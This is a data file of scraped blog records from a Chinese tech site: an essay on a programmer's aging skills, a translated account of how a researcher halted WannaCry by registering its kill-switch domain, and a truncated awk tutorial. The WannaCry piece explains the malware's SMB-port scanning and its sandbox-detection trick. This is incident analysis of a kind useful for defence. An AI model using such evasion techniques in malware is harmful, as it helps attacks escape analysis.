{"tags": "程序员,职场, 6 评论 ", "front_image_path": "full/3a9b3ac14a7d164c4fac1f8dd02ad33fe714e281.jpg", "title": "一名 40 岁“老”程序员的反思", "url_object_id": "8df5bb7e4280a3b3c671d801e0bafdfd", "url": "http://blog.jobbole.com/111182/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.bennorthrop.com/Essays/2016/reflections-of-an-old-programmer.php\">Ben Northrop</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/news/84850/reflections-of-an-old-programmer\">开源中国</a>   </div><p>【导读】：Ben Northrop 在 2016 年满了 40 岁，本文是他对职业生涯的思考。他认为从长远来看，应该多投资一些不容易过期、衰竭期较长的知识领域中。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1ffn0as06qzj20gp0d1tkl.jpg\"></p>\n<p>我是一名程序员，几个月前刚过完 40 岁生日。某个星期六的早晨，我参加了一个 React Native 技术交流会，演讲者正在竭力说服我们为什么它会成为移动开发领域真正的下一个大事件。但对我来说，它有点像 15 年前的 JSP，将所有的逻辑都放在演示代码里面。但我“老”了，我认为这是因为自己还没有完全理解它。</p>\n<p>演讲者展示完 PPT 后，现场进行编码，还展示了大约半打我没听说过的配套工具，这些都让我感到有点沮丧。</p>\n<p>当然，我并不是真的惊讶。在过去 20 年里，我也掌握了一些比较流行的技术，并享受驾驭它们的乐趣。新的东西总能给编程带来一丝激动的体验，并且能让事情变得更容易、更快和更清楚。但是在这个特别的早晨，在40岁的这个门槛上，我不得不承认我感觉有些落伍。我知道如果想跟上节奏，我得继续付出，抛弃一些已经充分吸收的知识，吸收一些新的知识，为下一次旅程做准备。</p>\n<p>我在想，我的编程生涯不像其他的专业人士，医生到了 40 岁不用担心他对血管系统的知识会蒸发，同样的，律师、水管工、会计、英语老师，也是如此。他们积累的知识是相对稳定的，并随着年龄会给予他们相应的尊重和补偿。但是在编程领域，20年的经验，似乎并没有赋予同样的优势。</p>\n<h3>两个概念</h3>\n<p>当然，我们的行业也不是那么糟糕 —— 程序员需要爱上很多东西 —— 有趣的是，无休止的跟进，好像是我们这个领域或多或少独一无二的特点。编程生涯是真的如此不同吗？如果是，为什么？对我们的事业轨迹来说又意味着什么？我想从以下两个观点来尝试回答这些问题。</p>\n<p><strong>第一个是知识衰退</strong>。我们所知道的一切，不仅仅是编程，都有一个有效期，过了这个期限将不再有用。我16岁学会了开车，到现在依然用的很好，这种技能可以认为有一个相对较长的半衰期 。医生的知识会越来越渊博，是因为他学习的每一件事情都是基于他以前的知识。而在编程领域，无论好还是坏，我认为：</p>\n<blockquote><p>程序员所积累的编程知识在十年后将有一半没用。</p></blockquote>\n<p>这可能有些偏激……但起码对我来说，似乎是正确的。如果我在这个期限中不学任何其他的东西，我敢打赌，只有大约一半的知识我可以在 2026 年继续使用（比如长期活着的 SQL ），另一半可能都是没用的（React Native，也许？） 。当然，我会不断获得新的知识来取代要死掉的那些东西，但这足够吗？ 2026 年我会比现在知道更多（有用的）知识吗？</p>\n<p>这也就是带来了<strong>第二个概念，知识积累速度。</strong>在所有领域，必须满足一定的知识门槛才能获得“认证”（或至少可聘用），职业生涯的早期通常都是在努力获取知识。然而，在编程领域，由于知识的快速衰减，似乎我们从来没有真正度过“学生时期”，我们必须永远一直学习。</p>\n<h3>三个阶段</h3>\n<p>如果去记录程序员的知识衰退和积累速度，我认为可能会是这样：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffn00hg72wj20hb0bqjrs.jpg\"></p>\n<p>在职业生涯的开始，可以称之为热切的学徒阶段，积累知识比较容易。一切都是新的，每个经验都是获得更多知识的工具。而且，由于年轻，我们不会有太多的义务，所以可能不介意花几个晚上和周末拿起新的语言和框架。重要的是，雇主对我们的期望值也比较低，我们可以在工作期间抠出一点时间来填补知识。这是一个有趣的阶段，连自己都没意识到自己有多坚持。</p>\n<p>然后，我们不再是新手，成为了自给自足的开发者。我们在学习中的投资已经得到回报，所知道的一切全部有用。在这个充满知识的阶段，我们开始赢得客户、同行和管理者的尊重，获得头衔、薪水和机会。虽然我们当时不一定看得出来，但这也是一个重要的转折点。</p>\n<p>两件事情发生了。首先，“高级”的晋升不仅仅是金钱，而是更多的期待。雇主需要他们的“明星程序员”成为领导者 – 帮助初级开发人员，审查代码，执行访谈，参加更多会议，帮助他们维护、构建复杂的旧版软件。这一切都很合理，但它巧妙地牺牲了我们的知识积累速度，我们不再有时间去读一些科技博客、文章。第二，这时候，我们首次体会到（或至少认识到）一点点知识的朽烂，早期学到的一些东西开始过时了。</p>\n<p>随后，我们进入第三个，也是最后一个阶段，衰落和流失。是的，我们是知识渊博和富有成就的，但我们也明白，事实上知道的已经比最初阶段更少（有用的）东西。我们可能没有时间积累足够的新知识来填补，这是令人沮丧的。我认为这就是为什么，在这时候，许多人开始转向 – 管理、销售、测试或农业（我的梦想）。我们意识到需要再次努力来保持我们的水平和熟练度 – 不然的话，我们的工作会在5年后比现在更糟。</p>\n<h3>两个方向</h3>\n<p>我正处于第三阶段。我还是很喜欢学习，但我明白，不努力的话，我可能会一直保持在“专家”的平衡状态边缘。</p>\n<p>首先，我尝试采取长远的观点。不要过度榨取自己，要尽可能的取得获得新经验的机会。我看到不少同事虽然获得了丰厚的薪酬，但职业很少有机会接触新兴事物。再过五年，他们会意识到他们的宝贵知识已经蒸发，薪酬与实际价值相去甚远。在某些情况下，我认为短期内赚更少的钱（有更好的雇主）会在长期的职业生涯中产生更多的钱（和稳定）。</p>\n<p>第二，考虑到时间有限，我试图去学习那些耐用的知识。也就是说，把精力投入在那些有更长的衰减期的知识上，比如，算法逻辑、应用安全、性能优化和架构。</p>\n<p>最后，很乐意听到大家的想法！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111182\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111182votetotal\">5</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111182\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 14 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 6 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/7cc829d3gy1ffn0as06qzj20gp0d1tkl.jpg"], "fav_nums": 14, "comment_nums": 6, "create_date": "2017/05/16", "praise_nums": 5}
{"tags": " 1 评论 ,安全,WannaCry,IT技术", "front_image_path": "full/6239740d346c76b074b2214e85b2f2b369068d45.jpg", "title": "我是如何意外阻止了勒索病毒的全球攻击", "url_object_id": "34722685ae899cb815abc05b5c97cbe3", "url": "http://blog.jobbole.com/111170/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html\">MalwareTech</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：5月12日，英国、意大利、俄罗斯等多个国家爆发勒索病毒攻击，中国国内校园网也出现大面积感染。请见我们昨天的推文：《<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5OTA1MDUyMA==&amp;mid=2655438382&amp;idx=1&amp;sn=c24f51822f2dfd689e7336e4ec6660c2&amp;chksm=bd730a598a04834fdb43648bd5f8cf0f3c7b4cce551c444bf9be6a20c1247fe878a5fe230893&amp;scene=21#wechat_redirect\" target=\"_blank\">全球爆发计算机勒索病毒（包含应急防范措施）</a>》。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffl58pw34yj20hn0bmn5y.jpg\"></p>\n<p><span style=\"font-weight: normal;\">WannaCrypt 勒索病毒开始肆虐后 ，英国的网络安全人员 MalwareTech 博主分析发现，该病毒都会访问一个域名 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com，如果连接成功，就停止攻击感染其他机器。于是他注册了这个域名，偶然阻止了勒索病毒的全球攻击。</span></p>\n<p style=\"text-align: center;\"><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffl5hrav85j20g107yq4l.jpg\"></p>\n<p style=\"text-align: center;\">（MalwareTech 的推特截图。后一条是说他也没想到注册域名后会中断扩散传播。前一条则是他的嘚瑟内容，23333）</p>\n<p><strong>MalwareTech 博主在事后写了<a href=\"https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html\" target=\"_blank\">一篇总结文章</a>，以下是伯乐在线的摘编：</strong></p>\n<p>我现在终于有时间写写周五发生的事情了，这两天各种电话和 Skype 都快把我催爆了，这件事情也花掉了我整个周末的时间（实际上前后一共花了四天时间，连我的工作时间都占了，就是如此）。也许你已经从各种媒体上听说了 WannaCrypt 病毒的事情了，但是我觉得你最好听听我的版本。</p>\n<p>我那天早上 10 点钟起床，然后就到“英国电子威胁信息共享平台”上去查看信息，因为我一直在跟踪一个叫 Emotet banking 木马的传播情况，这种木马病毒直至今日还很有威胁。然后我发现，有几个很普通的贴子提到说，有几个公司或者组织被“勒索木马”攻击了，不过这也并不是什么“大新闻”….至少当时还不是。接着我就关了电脑出去和朋友吃午饭了，就是在这个时候，WannaCrypt 勒索木马开始肆虐。</p>\n<p>当我下午两点半回到家的时候，我发现信息共享平台上已经到处都是 NHS（英国国家医疗体系）被攻击的消息了，据说全国有好几个NHS 下属机构的系统被木马攻击了，这也让我感觉到很可能要有“大新闻”产生了。尽管勒索型病毒攻击某些公共系统的情况并不新鲜，但是全国范围内的系统同时中招的情况可就不那么寻常了（而且现在 NHS 的雇员也挺聪明了，不会轻易点开带病毒的钓鱼邮件，所以这次能有这么大的传播范围，肯定是有什么其他的病毒传播方式。）在我的一个好朋友（他是信息安全研究员）和 Kafeine 软件的帮助下，我用最快的速度拿到了一个木马的样本。我在分析环境里运行了这个样本，发现木马会去访问一个未注册的域名（ <span style=\"color: #ff0000;\">iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</span> ），然后我就很快把这个域名注册了。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffl48x3p9mj20hs05tjsw.jpg\"></p>\n<p>使用 Cisco Umbrella，我们就能看到木马对特定域名的访问流量情况（当然是在我注册之前），这也能看出来，这次大波的木马攻击是在当地时间早晨 8 点开始的。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffl44m9hbtj20gl05f0sz.jpg\"></p>\n<p>在域名传播的同时，我在我的虚拟环境里又运行了一次样本，然后就看到了 WannaCrypt 勒索页面；但是更有意思的是，木马感染了我放在那里的测试文件以后，还尝试在 445 端口（SMB协议使用的就是这个端口）随机连接不同的 IP 地址。这种大量的访问尝试马上让我联想到了漏洞扫描，事实上这种对 SMB 端口的扫描行为也让我回忆起了最近报道过的，NSA 的 ShadowBroker 泄露事件，那个里面就有 SMB 漏洞扫描。当然，我当时没有证据能证明这次攻击就是 SMB 漏洞扫描，或者就是用 NSA 泄露出来的漏洞扫描工具来做的，所以我只能在 Twitter 上贴出我发现的东西，然后追踪木马感染的域名。</p>\n<blockquote>\n<p dir=\"ltr\" lang=\"en\">“我发现木马样本在安装 WannaCrypt 后会扫描 SMB。其他人找到的情况是不是也是这样？注意到木马是采用 P2P 方式传播。” — MalwareTech (@MalwareTechBlog) <a href=\"https://twitter.com/MalwareTechBlog/status/863054290360946688\">May 12, 2017</a></p>\n</blockquote>\n<p>从反馈来看，我得到了相互矛盾的答案，我很满心焦虑地重新装载了之前的分析环境，然后把木马样本又运行了一遍……结果什么事情也没发生。然后我又修改了 host 文件，这样可以让木马对域名的连接失败，然后我又运行了一遍，结果……木马感染成功了。</p>\n<p>我估计你没法想象一个成年人高兴得上蹿下跳的画面吧，而且这个人高兴的理由居然是自己的电脑被勒索木马感染了，但是这个人就是我。</p>\n<p>勒索木马第一次运行失败了，但是第二次成功感染了。这说明，只要木马能向特定的域名注册成功，那么就能阻止木马的传播，也能阻止木马感染新的电脑。（一开始我并没有公布这个发现，而是通过逆向工程反复验证，不过现在应该已经有其他人在网上公布了这个方法了。）</p>\n<p>所以，这么简单的一个伎俩，怎么就能让全球肆虐的木马病毒停止传播呢？</p>\n<p>Talos 写了一篇非常不错的<a href=\"http://blog.talosintelligence.com/2017/05/wannacry.html\">文章</a>来解释这个原理，我在这里直接使用 Darien 的截图来说明：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffl47zwtnaj20mt0c3t9t.jpg\"></p>\n<p>上面代码做的事情，就是尝试连接我们注册的域名。<span style=\"color: #ff0000;\">如果连接失败的话，那么就感染系统，如果连接成功的话，木马就会退出执行</span>（一开始我看这个代码并不是很明白，因为我不知道代码的上下文，也不知道这个函数执行的结果返回上一级会干什么。）</p>\n<p>我们一开始认为，这个域名是一个“死亡开关”（Kill Switch），如果出了大问题就可以用它来关闭攻击。不过现在我觉得，这是木马用来切断进一步运行的机制，当然这是一个糟糕的设计。</p>\n<p>在沙箱环境里，木马的所有的网络请求都会被拦截，然后沙箱会返回一个虚拟的 IP 地址给木马程序，而不是木马要访问的真正的 IP 地址。这种工作原理的副作用就是，如果木马要求访问一个未注册的域名，沙箱则会告诉木马说访问成功（真实情况下是不可能成功的）。</p>\n<p>我觉得勒索木马的作者在程序里故意要访问一个未经注册的域名，这种域名在虚拟机的沙箱环境里会被当做“已注册”来处理，一旦程序发现这些“不应该返回结果”的域名居然返回了结果，那么就知道这是在虚拟机环境里运行的，接着木马程序就会自动退出，阻止进一步的入侵分析行为。这种技术并不是首创，Necurs 木马之前就用过这种伎俩（Necurs 会去访问 5 个随机生成的域名，如果这 5 个域名都返回同一个 IP 地址的话，木马程序就会自动退出）。</p>\n<p>然而，因为 WannaCrypt 却是在程序里写死了这个用来验证的假域名，而因为我真的注册了这个域名，所以现在不论是在虚拟机里，还是在真实的计算机上，这个域名都会真的返回响应信息，所以木马无论在任何条件下都会相信自己是在虚拟机里运行，从而自动退出……所以说，我们这不经意的注册行为无意中阻止了木马在传播和进一步的勒索行为。我们会继续持有这个域名，以阻止这个病毒样本的进一步感染。</p>\n<p>（伯乐在线补注：原作者感谢了在整个分析过程中帮助过他们的组织和机构，我们这里就省略了。）</p>\n<p>现在，我想我终于该睡会儿了。</p>\n<h3>伯乐在线补充：</h3>\n<p>① MalwareTech 还制作了一个在线查看中招电脑的实时地图：<a href=\"https://intel.malwaretech.com/WannaCrypt.html\" target=\"_blank\">https://intel.malwaretech.com/WannaCrypt.html</a></p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffl5kvs1vdj211l0iijx8.jpg\"></p>\n<p>② 5月14日下午，国家网络与信息安全信息通报中心发布紧急通报：</p>\n<blockquote><p>监测发现，在全球范围内爆发的 WannaCry 勒索病毒出现了变种：WannaCry 2.0， 与之前版本的不同是，这个变种取消了 Kill Switch，不能通过注册某个域名来关闭变种勒索病毒的传播，该变种传播速度可能会更快。请广大网民尽快升级安装 Windows 操作系统相关补丁，已感染病毒机器请立即断网，避免进一步传播感染。</p></blockquote>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/78805a221a988e79ef3f42d7c5bfd4187.jpeg\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111170\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111170votetotal\">6</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111170\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/avatars/5423/Corbis-42-221258652.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            黄小非：毕业于重庆大学计算机系，南开大学软件工程硕士，SCJP。 目前在一家国企信息中心任职软件开发工程师。主要技术兴趣为Java平台相关技术、系统构架、C/C++、计算机图形学等。（新浪微博：@黄小非）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/huangxiaofei\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/huangxiaofei/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 58</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/large/63918611gy1ffl58pw34yj20hn0bmn5y.jpg"], "fav_nums": 1, "comment_nums": 1, "create_date": "2017/05/14", "praise_nums": 6}
{"tags": "awk,IT技术", "front_image_path": "full/78b619ca60d2d1b9557cdf4810ee5df49f010a2a.jpg", "title": "详解 awk 工具的使用方法", "url_object_id": "aae94ada54655fb3b913193e2bee306b", "url": "http://blog.jobbole.com/111002/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/jarly/blog/898144\">jarly</a>   </div><p>【伯乐在线转注】：awk 是一个强大的文本分析工具。它不仅是 Linux 中，也是任何环境中现有的功能最强大的数据处理引擎之一。相对于 grep 的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。</p>\n<hr>\n<p>当你第一次拿起双手在电脑上使用 awk 命令处理一个或者多个文件的时候，它会依次读取文件的每一行内容, 然后对其进行处理，awk 命令默认从 stdio 标准输入获取文件内容, awk 使用一对单引号来表示 一些可执行的脚本代码，在可执行脚本代码里面，使用一对花括号来表示一段可执行代码块，可以同时存在多个代码块。 awk 的每个花括号内同时又可以有多个指令，每一个指令用分号分隔，awk 其实就是一个脚本编程语言。说了这么多，你肯定还是一脸的懵逼。你猜对了，上面这些都是废话。先别急，客官请往下看……</p>\n<p><strong>awk 命令的基本格式</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af72160047685\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nawk [options] 'program' file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af72160047685-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af72160047685-1\"><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">options</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'program'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><code>options</code> 这个表示一些可选的参数选项，反正就是你爱用不用，不用可以拉到。。。 <code>program</code> 这个表示 awk 的可执行脚本代码，这个是必须要有的。 <code>file</code> 这个表示 awk 需要处理的文件，注意是纯文本文件，不是你的 mp3，也不是 mp4 啥的。。</p>\n<p><strong>先来一个 awk 的使用例子热热身</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af7b297095173\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $0}' /etc/passwd</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af7b297095173-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af7b297095173-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">passwd</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>awk 命令的可执行脚本代码使用单引号括起来，紧接着里面是一对花括号，记住是 “花括号” 不是 “花姑娘”，然后花括号里面就是一些可执行的脚本代码段，当 awk 每读取一行之后，它会依次执行双引号里面的每个脚本代码段，在上面这个例子中， <code>$0</code> 表示当前行。当你执行了上面的命令之后，它会依次将 /etc/passwd 文件的每一行内容打印输出，你一定在想：这有个毛用，用 cat 命令也能搞定。没错！上面这个命令没个毛用，请往下看。</p>\n<p><strong>awk 自定义分隔符</strong></p>\n<p>awk 默认的分割符为空格和制表符，我们可以使用 -F 参数来指定分隔符</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af7f607979507\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" 